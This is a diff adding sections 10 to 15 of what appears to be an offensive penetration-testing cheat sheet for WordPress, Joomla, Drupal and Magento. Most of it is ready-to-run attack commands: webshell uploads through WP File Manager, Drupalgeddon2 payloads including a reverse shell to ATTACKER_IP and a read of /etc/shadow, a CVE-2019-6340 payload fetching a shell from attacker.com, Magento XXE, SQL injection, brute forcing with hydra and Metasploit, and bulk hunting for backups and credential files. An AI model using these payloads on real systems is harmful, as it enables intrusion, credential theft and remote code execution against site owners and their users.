@@ -884,3 +884,392 @@ curl -s http://target/user/register
 # Check for trusted_host configuration
 grep "trusted_host" sites/default/settings.php
 ```
+
+---
+
+## 10. WordPress Plugin Exploitation -- Specific CVEs
+
+### 10.1 WP File Manager Plugin Exploitation
+
+```bash
+# WP File Manager (multiple CVEs) -- unauthenticated file upload
+# CVE-2020-25213 -- WP File Manager 6.0-6.9
+# Upload PHP webshell via the fm_admin endpoint
+curl -s -X POST "http://target/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" \
+  -F "reqid=1744" -F "cmd=upload" -F "target=l1_Lw" -F "mtime[]"="" \
+  -F "upload[]=@shell.php"
+
+# Verify uploaded file
+curl -s "http://target/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"
+```
+
+### 10.2 Elementor Pro and WooCommerce Exploitation
+
+```bash
+# Elementor Pro -- unauthenticated data extraction via REST API
+# Check for Elementor endpoints
+curl -s "http://target/wp-json/elementor/v1" | head -20
+curl -s "http://target/wp-json/elementor-pro/v1" | head -20
+
+# WooCommerce -- sensitive data exposure via REST API
+curl -s "http://target/wp-json/wc/v3" | jq .
+curl -s "http://target/wp-json/wc/v3/customers" | jq .
+curl -s "http://target/wp-json/wc/v3/orders" | jq .
+
+# WooCommerce -- coupon enumeration
+curl -s "http://target/wp-json/wc/v3/coupons" | jq .
+```
+
+### 10.3 Duplicator Plugin Backup Extraction
+
+```bash
+# Duplicator plugin -- backup file download
+# CVE-2020-11738 -- Duplicator < 1.3.28
+# Check for installer files
+curl -sI "http://target/installer.php" | head -5
+curl -sI "http://target/wp-content/backups-dup-light/installer.php" | head -5
+
+# Download backup archive
+curl -s -o backup.zip "http://target/wp-content/backups-dup-light/backup_archive.zip"
+curl -s -o backup.zip "http://target/wp-snapshots/tmp/package.zip"
+
+# Extract WordPress files and credentials from backup
+unzip backup.zip -d backup_extracted/
+grep -r "DB_PASSWORD" backup_extracted/
+grep -r "wp-config" backup_extracted/
+```
+
+### 10.4 Contact Form 7 and Other Common Plugins
+
+```bash
+# Contact Form 7 -- email header injection and LFI
+# Test for CVE-2020-36458
+curl -s "http://target/wp-json/contact-form-7/v1/contact-forms" | jq .
+
+# WPForms -- information disclosure
+curl -s "http://target/wp-json/wpforms/v1" | head -10
+
+# Yoast SEO -- data exposure via REST API
+curl -s "http://target/wp-json/yoast/v1" | head -10
+
+# UpdraftPlus -- backup download
+curl -sI "http://target/wp-content/updraft/index.html"
+curl -s "http://target/wp-content/updraft/" | grep -oP 'href="[^"]+\.zip"'
+```
+
+---
+
+## 11. Joomla Advanced Scanning and Exploitation
+
+### 11.1 Joomla Deep Component Enumeration
+
+```bash
+# Comprehensive Joomla component enumeration with curl
+for component in $(cat /usr/share/wordlists/dirb/common.txt); do
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://target/index.php?option=com_$component")
+  if [ "$STATUS" != "404" ] && [ "$STATUS" != "500" ]; then
+    echo "[FOUND:$STATUS] com_$component"
+  fi
+done
+
+# Joomla vulnerable component paths
+curl -s http://target/components/com_users/
+curl -s http://target/components/com_media/
+curl -s http://target/components/com_contact/
+curl -s http://target/components/com_content/
+curl -s http://target/components/com_fields/
+curl -s http://target/components/com_config/
+curl -s http://target/components/com_installer/
+
+# Joomla module enumeration
+curl -s http://target/modules/ | grep -oP 'href="[^/"]+/"'
+curl -s http://target/plugins/ | grep -oP 'href="[^/"]+/"'
+```
+
+### 11.2 Joomla CVE-2023-23752 Deep Exploitation
+
+```bash
+# CVE-2023-23752 -- Joomla 4.x unauthorized info disclosure
+# Extract full configuration including database credentials
+curl -s http://target/api/index.php/v1/config/application?public=true | jq .
+
+# Extract via alternative API endpoints
+curl -s http://target/api/index.php/v1/config/application | jq .
+curl -s http://target/api/index.php/v1/users | jq .
+
+# Extract CMS configuration data
+curl -s "http://target/api/index.php/v1/config/application?public=true" \
+  | jq '{db: .data.attributes.db, user: .data.attributes.user, password: .data.attributes.password}'
+
+# Verify Joomla version is vulnerable
+curl -s http://target/administrator/manifests/files/joomla.xml | grep version
+```
+
+### 11.3 Joomla Template Injection and RCE
+
+```bash
+# Joomla template injection for RCE (requires admin)
+# Edit template via API
+curl -s -X PATCH "http://target/api/index.php/v1/templates/styles/1" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer TOKEN" \
+  -d '{"params":{"custom_css":"body{}<?php system($_GET[\"cmd\"]); ?>"}}'
+
+# Joomla extensions directory traversal
+curl -s http://target/components/com_media/tmpl/images/
+curl -s http://target/media/com_content/images/
+
+# Joomla log file access for information disclosure
+curl -s http://target/administrator/logs/
+curl -s http://target/logs/error.php
+```
+
+---
+
+## 12. Drupal Advanced Exploitation
+
+### 12.1 Drupalgeddon2 (CVE-2018-7600) -- Advanced Payloads
+
+```bash
+# Drupalgeddon2 with reverse shell payload
+curl -s http://target -X POST \
+  -d "form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&name[#post_render][]=system&name[#type]=markup&name[#markup]=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
+
+# Drupalgeddon2 with encoded PHP payload
+# PHP: file_put_contents('/tmp/shell.php', '<?php system($_GET["cmd"]); ?>')
+curl -s http://target -X POST \
+  -d "form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&name[#post_render][]=exec&name[#type]=markup&name[#markup]=echo+%27PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2B%27+%7C+base64+-d+>+/tmp/shell.php"
+
+# Drupalgeddon2 using the Ruby exploit script
+ruby drupalgeddon2.rb http://target -c "id; cat /etc/shadow"
+
+# Drupalgeddon2 check if vulnerable without exploitation
+curl -s http://target -X POST \
+  -d "form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&name[#post_render][]=printf&name[#type]=markup&name[#markup]=VULN_CHECK_$(date +%s)"
+```
+
+### 12.2 CVE-2019-6340 -- Drupal REST API RCE
+
+```bash
+# CVE-2019-6340 -- Drupal 8.x REST API RCE
+# Exploit via GET request with crafted Accept header
+curl -s "http://target/node/1?_format=hal_json" \
+  -H "Accept: application/hal+json" \
+  -H "Content-Type: application/hal+json" \
+  --data-binary '{"_links":{"type":{"href":"http://target/rest/type/node/article"}},"title":[{"value":"test"}],"type":[{"target_id":"article"}],"_embedded":{"http://target/rest/relation/node/article/field_image":[{"uri":{"value":"http://attacker.com/shell.php"},"type":[{"target_id":"file"}],"_links":{"type":{"href":"http://target/rest/type/file/image"}}}]}}'
+
+# Check if REST API endpoints are exposed
+curl -s http://target/jsonapi | head -20
+curl -s http://target/node/1?_format=json | head -20
+curl -s http://target/entity/node?_format=hal_json | head -20
+```
+
+---
+
+## 13. Magento CMS Exploitation
+
+### 13.1 Magento Fingerprinting and Version Detection
+
+```bash
+# Magento version detection
+curl -s http://target/magento_version | head -5
+curl -s http://target/RELEASE_NOTES.txt | head -10
+curl -s http://target/errors/default/report.phtml | grep -i magento
+curl -sI http://target | grep -i "x-magento"
+
+# Magento admin panel detection
+curl -s http://target/admin/ | head -10
+curl -s http://target/admin123/ | head -10
+curl -s http://target/manager/ | head -10
+
+# Magento API endpoints
+curl -s http://target/rest/V1/modules | jq .
+curl -s http://target/rest/V1/store/storeViews | jq .
+curl -s http://target/rest/all/V1/categories | jq .
+
+# Magento static content fingerprinting
+curl -s http://target/static/frontend/ | head -5
+curl -s http://target/pub/static/frontend/ | head -5
+```
+
+### 13.2 Magento Known CVEs
+
+```bash
+# CVE-2024-34102 -- Magento Adobe Commerce XXE (CosmicSting)
+# Critical unauthenticated XXE leading to RCE
+curl -s -X POST "http://target/rest/V1/guest-carts/1/estimate-shipping-methods" \
+  -H "Content-Type: application/json" \
+  -d '{"address":{"totals":{"total_quantity":1},"postcode":"<new xmlns=\"x\"><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><xxe>&xxe;</xxe>]]>","region":"test"}}'
+
+# Magento checkout/cart SQL injection (older versions)
+curl -s "http://target/checkout/cart/add/product/1?qty=1' OR '1'='1" | head -20
+
+# Magento admin panel brute force
+hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
+  "/admin/login/index.php/:login[username]=^USER^&login[password]=^PASS^&form_key=KEY:Invalid"
+```
+
+---
+
+## 14. CMS Fingerprinting Techniques (Advanced)
+
+### 14.1 HTTP Header Analysis for CMS Detection
+
+```bash
+# Collect and analyze HTTP response headers
+curl -sI http://target | grep -iE "server|x-powered-by|x-generator|link|set-cookie|x-drupal|x-magento|x-joomla"
+
+# CMS-specific header patterns
+# WordPress: Link: <http://target/?p=123>; rel=shortlink, X-Pingback
+# Joomla: X-Content-Encoded-By: Joomla
+# Drupal: X-Generator: Drupal, X-Drupal-Cache
+# Magento: X-Magento-Cache-Control, X-Magento-Tags
+
+# Cookie-based CMS detection
+curl -sI http://target | grep -i "set-cookie"
+# WordPress: wordpress_logged_in_, wp-settings-
+# Joomla: joomla_user_state, ea4a6b3a3b
+# Drupal: SSESS, drupal.uid
+# Magento: PHPSESSID with mage-cache-session
+
+# robots.txt analysis for CMS fingerprinting
+curl -s http://target/robots.txt | grep -iE "wordpress|joomla|drupal|magento|admin|wp-|sites/default"
+```
+
+### 14.2 JavaScript and CSS Analysis for CMS Detection
+
+```bash
+# Check for CMS-specific JavaScript files
+curl -s http://target/wp-includes/js/wp-embed.min.js | head -1
+curl -s http://target/media/jui/js/jquery.min.js | head -1  # Joomla
+curl -s http://target/misc/drupal.js | head -1              # Drupal
+curl -s http://target/static/frontend/js/jquery.min.js | head -1  # Magento
+
+# CSS file analysis for theme/CMS identification
+curl -s http://target/wp-content/themes/*/style.css | head -5
+curl -s http://target/modules/mod_custom/tmpl/default.php | head -5
+
+# Favicon hash comparison (use favicon.ico to identify CMS)
+curl -s http://target/favicon.ico | md5sum
+# Compare against known CMS favicon hashes
+```
+
+### 14.3 Wappalyzer-Style CMS Detection
+
+```bash
+# Simulate Wappalyzer detection using curl and grep
+curl -s http://target | grep -oE "wp-content|wp-includes|wp-json|wordpress" | sort -u
+curl -s http://target | grep -oE "/media/jui|/components/com_|/modules/mod_" | sort -u
+curl -s http://target | grep -oE "/sites/default|/misc/drupal|Drupal.settings" | sort -u
+curl -s http://target | grep -oE "Magento|magento|Mage." | sort -u
+
+# Nuclei technology detection templates
+nuclei -u http://target -t ~/nuclei-templates/http/technologies/ -tags cms -silent
+
+# Combined fingerprinting with whatweb
+whatweb -a 3 -v http://target 2>/dev/null | grep -iE "wordpress|joomla|drupal|magento|cms"
+```
+
+---
+
+## 15. CMS Automated Exploitation Frameworks
+
+### 15.1 WPScan API-Based Bulk Scanning
+
+```bash
+# Bulk WordPress scanning with WPScan and API token
+for target in $(cat wp_targets.txt); do
+  echo "[SCANNING] $target"
+  wpscan --url "http://$target" --enumerate u,vp,vt,dbe,cb \
+    --api-token YOUR_API_TOKEN --output "wpscan_${target}.txt" --format cli-no-color
+done
+
+# WPScan with vulnerability export
+wpscan --url http://target --enumerate vp,vt --api-token YOUR_API_TOKEN \
+  --output wpscan_vulns.json --format json
+```
+
+### 15.2 CMSmap -- Multi-CMS Scanner
+
+```bash
+# CMSmap -- automated scanning for WordPress, Joomla, Drupal
+cmsmap -u http://target
+
+# WordPress specific scan
+cmsmap -u http://target -t wp --noedb
+
+# Joomla specific scan with brute force
+cmsmap -u http://target -t joomla -a admin -w /usr/share/wordlists/rockyou.txt
+
+# Drupal specific scan
+cmsmap -u http://target -t drupal
+
+# Save results to file
+cmsmap -u http://target -o cmsmap_results.txt
+```
+
+### 15.3 Automated CMS Exploitation with Metasploit
+
+```bash
+# Metasploit WordPress scanner module
+msfconsole -q -x "use auxiliary/scanner/http/wordpress_scanner; set RHOSTS target; run; exit"
+
+# WordPress XML-RPC brute force via Metasploit
+msfconsole -q -x "use auxiliary/scanner/http/wordpress_xmlrpc_login; set RHOSTS target; set USERNAME admin; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; exit"
+
+# Drupal Drupalgeddon2 exploit
+msfconsole -q -x "use exploit/multi/http/drupal_drupageddon2; set RHOSTS target; run; exit"
+
+# Joomla HTTP Header RCE (CVE-2015-8562)
+msfconsole -q -x "use exploit/multi/http/joomla_http_header_rce; set RHOSTS target; run; exit"
+```
+
+### 15.4 Nuclei CMS Fuzzing Templates
+
+```bash
+# CMS fuzzing with Nuclei custom templates
+# Create custom CMS detection template
+cat > cms-detect.yaml << 'EOF'
+id: cms-detect
+info:
+  name: CMS Technology Detection
+  author: custom
+  severity: info
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "wp-content"
+          - "wp-includes"
+        condition: or
+      - type: word
+        words:
+          - "/components/com_"
+          - "/modules/mod_"
+        condition: or
+EOF
+
+nuclei -u http://target -t cms-detect.yaml -v
+```
+
+### 15.5 CMS Backup and Database File Hunting
+
+```bash
+# Automated CMS backup file discovery
+for target in $(cat targets.txt); do
+  echo "[CHECKING] $target"
+  for path in "backup.sql" "db.sql" "database.sql" "dump.sql" "site.sql" \
+    "backup.tar.gz" "backup.zip" "site.zip" "htdocs.tar.gz" "public_html.tar.gz" \
+    "wp-config.php.bak" "wp-config.php.old" "configuration.php.bak" \
+    "settings.php.bak" ".env" ".env.bak" ".env.old"; do
+    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://$target/$path")
+    if [ "$STATUS" = "200" ]; then
+      echo "[FOUND:$STATUS] http://$target/$path"
+    fi
+  done
+done
+```
